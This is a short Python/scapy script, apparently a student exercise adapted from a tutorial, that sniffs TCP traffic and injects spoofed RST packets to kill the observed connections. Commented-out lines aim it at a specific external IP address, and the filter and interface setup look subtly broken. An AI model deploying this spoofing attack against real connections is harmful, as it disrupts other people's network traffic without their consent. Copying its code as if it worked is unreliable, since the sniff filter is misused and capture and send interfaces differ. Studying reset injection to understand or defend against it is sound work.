from scapy.all import *
import subprocess
import ifaddr
import binascii

from scapy.layers.inet import TCP, IP, Ether

conf.L3socket = L3RawSocket


def logRST(p):
    src_ip = p[IP].src  # Took this code from Roberheaton
    src_port = p[TCP].sport
    dst_ip = p[IP].dst
    dst_port = p[TCP].dport
    seq = p[TCP].seq
    ack = p[TCP].ack
    window = p[TCP].window
    flags = p[TCP].flags  # End of code taken from RH

    sendRST(dst_ip, dst_port, src_ip, src_port, ack, window)

    print("---Found packet---\nsource: %s\nport: %s\nseq: %s\nack: %s"
          % (src_ip, src_port, seq, ack))

    return True


def sendRST(dst_ip, dst_port, src_ip, src_port, ack, window):
    ip = IP(src=dst_ip, dst=src_ip)
    tcp = TCP(sport=dst_port, dport=src_port, flags="R", window=window, seq=ack)  # Fix seq + ack
    p = Ether() / ip / tcp
    sendp(p, iface="en0")


def sniffPackets(DST_IP):
    print("Sniffing for packets sent to: %s" % DST_IP)
    p = sniff(lfilter="host 127.0.0.1", prn=logRST, count=10, iface='lo0')
    #p = sniff(filter="host "+DST_IP, prn=logRST, count=10, iface="en0")

def main():

    sniffPackets("127.0.0.1")
    # sniffPackets("131.229.72.7")


if __name__ == '__main__':
    main()

# Use  nc 131.229.72.7 80
